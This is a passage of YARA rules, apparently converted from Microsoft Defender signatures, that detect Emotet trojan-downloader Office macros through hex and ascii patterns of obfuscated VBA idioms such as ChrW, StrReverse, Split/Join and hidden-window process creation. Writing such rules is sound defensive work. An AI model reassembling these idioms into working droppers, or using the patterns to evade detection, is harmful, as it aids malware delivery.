        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 [0-32] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 73 29 [0-32] 2e 20 5f 02 00 73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VC_2147749639_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VC!MTB"
        threat_id = "2147749639"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 [0-96] 22 20 2b 20 65 65 20 2b 20 64 66 65 2c 20 69 64 73 66 65 65 65 29}  //weight: 1, accuracy: Low
        $x_1_4 = "= Split(sdddd, weff)" ascii //weight: 1
        $x_1_5 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VE_2147749640_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VE!MTB"
        threat_id = "2147749640"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "= ChrW(ewrrc + wdKeyP + iqwjkd)" ascii //weight: 1
        $x_1_4 = "= ChrW(sdd + wdKeyP + cxz)" ascii //weight: 1
        $x_1_5 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VB_2147749648_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VB!MTB"
        threat_id = "2147749648"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 54 72 69 6d 28 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VD_2147749652_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VD!MTB"
        threat_id = "2147749652"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 22 [0-96] 77 [0-101] 22 20 2b 20}  //weight: 1, accuracy: Low
        $x_1_4 = {44 65 62 75 67 2e 50 72 69 6e 74 20 22 50 75 74 69 6e 2e 56 2e 56 22 20 2b 20 [0-4] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VF_2147749657_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VF!MTB"
        threat_id = "2147749657"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 [0-32] 20 3d 20 53 70 6c 69 74 28 [0-32] 20 2b 20 ?? 54 72 69 6d 28 53 74 72 52 65 76 65 72 73 65 28 [0-16] 29 29 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AR_2147749660_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AR!MTB"
        threat_id = "2147749660"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {65 78 65 05 00 00 55 52 4c 44 6f 01 00 00 44 01 00 00 73 08 00 00 64 54 6f 46 69 6c 65 41 05 00 00 77 6e 6c 6f 61 04 00 00 6c 4d 6f 6e 06 00 00 4a 4a 43 43 4a 4a}  //weight: 10, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VG_2147749674_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VG!MTB"
        threat_id = "2147749674"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "= ChrW(Int(wdKeyP))" ascii //weight: 1
        $x_1_4 = {3d 20 4a 6f 69 6e 28 [0-32] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {53 75 62 20 [0-32] 28 29 02 00 44 65 62 75 67 2e 50 72 69 6e 74 20 22 50 75 74 69 6e 2e 56 2e 56 22 20 2b 20 67 67 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VH_2147749684_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VH!MTB"
        threat_id = "2147749684"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {4a 6f 69 6e 28 53 70 6c 69 74 28 [0-69] 2c 20 [0-80] 29 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 [0-32] 28 29 02 00 44 65 62 75 67 2e 50 72 69 6e 74 20 22 64 68 68 68 68 68 65 65 22 20 2b 20 6e 73 77 77 77 20 2b 20 22 6f 70 65 6e 64 62 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VI_2147749692_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VI!MTB"
        threat_id = "2147749692"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 6f 20 57 68 69 6c 65 20 [0-64] 2e 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = {43 72 65 61 74 65 28 [0-32] 20 26 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 22 2d 65 20 22 [0-32] 20 3d 20 5f 02 00 22 70 69 7a 64 65 63 22}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 22 2d 65 20 22 [0-32] 20 3d 20 5f 02 00 22 4d 43 45 22}  //weight: 1, accuracy: Low
        $x_1_5 = {2b 20 53 74 72 52 65 76 65 72 73 65 28 64 73 65 29 29 [0-32] 20 3d 20 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VJ_2147749715_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VJ!MTB"
        threat_id = "2147749715"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 43 68 72 57 28 [0-32] 20 2b 20 77 64 4b 65 79 50 20 2b 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "+ StrReverse(dse))" ascii //weight: 1
        $x_1_4 = {64 73 65 20 3d 20 [0-32] 2e [0-21] 2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_5 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-21] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VK_2147749737_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VK!MTB"
        threat_id = "2147749737"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 [0-64] 2c 20 [0-64] 29 2c 20 22 22 20 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ControlTipText + \"-e \"" ascii //weight: 1
        $x_1_4 = "Debug.Print \"Operaion\" + NS + \"S\"" ascii //weight: 1
        $x_1_5 = "StrReverse(dse)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VL_2147749751_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VL!MTB"
        threat_id = "2147749751"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 [0-64] 2c 20 [0-48] 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ControlTipText + \"-e \"" ascii //weight: 1
        $x_1_4 = "StrReverse(dse)" ascii //weight: 1
        $x_1_5 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-18] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VM_2147749752_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VM!MTB"
        threat_id = "2147749752"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 [0-64] 2c 20 [0-48] 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ControlTipText + \"-e \"" ascii //weight: 1
        $x_1_4 = "StrReverse(dse)" ascii //weight: 1
        $x_1_5 = ".Pages(0).Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VN_2147749767_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VN!MTB"
        threat_id = "2147749767"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 43 68 72 57 28 49 6e 74 28 77 64 4b 65 79 53 29 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4a 6f 69 6e 28 53 70 6c 69 74 28 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_4 = ".ControlTipText" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VO_2147749774_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VO!MTB"
        threat_id = "2147749774"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = ".ControlTipText + \"     -e      \"" ascii //weight: 1
        $x_1_3 = ".Pages(0).Caption" ascii //weight: 1
        $x_1_4 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-21] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VP_2147749795_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VP!MTB"
        threat_id = "2147749795"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 4a 6f 69 6e ?? 28 53 70 6c 69 74 28 [0-32] 2c 20 [0-48] 29 2c 20 [0-37] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2b 20 43 68 72 57 28 49 6e 74 28 77 64 4b 65 79 53 29 29 20 2b 20 [0-32] 2e [0-32] 2e 54 61 67 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VQ_2147749808_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VQ!MTB"
        threat_id = "2147749808"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = ".Pages(0).Caption" ascii //weight: 1
        $x_1_3 = {2b 20 53 74 72 52 65 76 65 72 73 65 28 [0-6] 29 29 [0-32] 5f}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 54 61 67 [0-32] 5f}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 43 6f 6e 74 72 6f 6c 54 69 70 54 65 78 74 20 2b 20 6f 49 50 [0-32] 5f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VR_2147749812_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VR!MTB"
        threat_id = "2147749812"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = ".ControlTipText + oIP" ascii //weight: 1
        $x_1_3 = {6f 49 50 20 3d 20 22 20 20 20 20 20 2d 65 20 20 20 20 20 20 22 [0-32] 20 3d 20 43 68 72 57 28 49 6e 74 28 77 64 4b 65 79 50 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-32] 20 2b}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VS_2147749824_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VS!MTB"
        threat_id = "2147749824"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-32] 20 3d 20 54 72 69 6d 24 28 22 [0-53] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = ".ControlTipText +" ascii //weight: 1
        $x_1_4 = ".Pages(0).Caption" ascii //weight: 1
        $x_1_5 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-21] 20 2b}  //weight: 1, accuracy: Low
        $x_1_6 = {2b 20 53 74 72 52 65 76 65 72 73 65 28 [0-21] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VT_2147749862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VT!MTB"
        threat_id = "2147749862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 43 68 72 57 28 [0-32] 2e 5a 6f 6f 6d 20 2b 20 [0-8] 29 20 2b 20 22 [0-64] 77 [0-48] 69 [0-48] 6e [0-48] 33 [0-48] 32 [0-69] 22 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = "ChrW(Int(wdKeyP))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VV_2147749881_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VV!MTB"
        threat_id = "2147749881"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2c 20 [0-90] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-16] 49 66 [0-48] 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = ".ControlTipText +" ascii //weight: 1
        $x_1_4 = ".Pages(0).Caption" ascii //weight: 1
        $x_1_5 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-21] 20 2b}  //weight: 1, accuracy: Low
        $x_1_6 = {2b 20 53 74 72 52 65 76 65 72 73 65 28 [0-32] 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VW_2147749889_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VW!MTB"
        threat_id = "2147749889"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2e [0-48] 20 2b 20 [0-32] 20 2b 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 43 68 72 57 28 [0-32] 2e 5a 6f 6f 6d 20 2b}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 4a 6f 69 6e 28 [0-24] 2c 20 4e 6f 4c 69 6e 65 42 72 65 61 6b 41 66 74 65 72 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VY_2147749906_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VY!MTB"
        threat_id = "2147749906"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 2e [0-48] 20 2b 20 [0-32] 20 2b 20 [0-32] 2c}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 4e 6f 4c 69 6e 65 42 72 65 61 6b 41 66 74 65 72 20 2b 20 [0-32] 20 2b 20 [0-16] 2c 20 [0-32] 2c 20 [0-21] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 [0-32] 2c 20 22 [0-21] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {73 68 6f 77 77 69 6e 64 6f 77 20 3d 20 [0-32] 20 2b}  //weight: 1, accuracy: Low
        $x_1_5 = ".Pages(0).Caption" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VZ_2147749908_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VZ!MTB"
        threat_id = "2147749908"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 [0-32] 2e 20 5f 02 00 43 72 65 61 74 65 28 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-32] 20 2b 20 [0-16] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 52 65 70 6c 61 63 65 ?? 28 22 [0-53] 2c 20 [0-32] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 49 6e 53 74 72 52 65 76 28 22 [0-53] 2c 20 [0-32] 29}  //weight: 1, accuracy: Low
